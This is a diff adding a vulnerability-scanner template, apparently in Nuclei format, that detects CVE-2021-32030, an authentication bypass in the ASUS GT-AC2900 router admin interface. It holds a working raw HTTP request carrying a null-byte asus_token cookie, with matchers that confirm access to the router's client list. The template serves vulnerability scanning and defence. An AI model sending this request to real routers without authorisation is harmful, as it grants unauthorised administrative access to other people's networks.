@@ -1,0 +1,33 @@
+id: CVE-2021-32030
+
+info:
+  name: ASUS GT-AC2900 - Authentication Bypass (CVE-2021-32030)
+  author: security-researcher
+  severity: critical
+  description: ASUS GT-AC2900 administrator application is vulnerable to authentication bypass due to improper handling of null byte in the asus_token cookie, allowing unauthorized access to the admin interface.
+  reference:
+    - https://github.com/atredispartners/advisories/blob/master/ATREDIS-2020-0010.md
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32030
+  tags: cve,cve2021,auth-bypass,asus
+
+http:
+  - raw:
+      - |
+        GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: asusrouter--
+        Cookie: asus_token=\0Invalid; clickedItem_tab=0
+        Referer: https://{{Hostname}}/
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "get_cfg_clientlist"
+          - "model_name"
+        condition: or
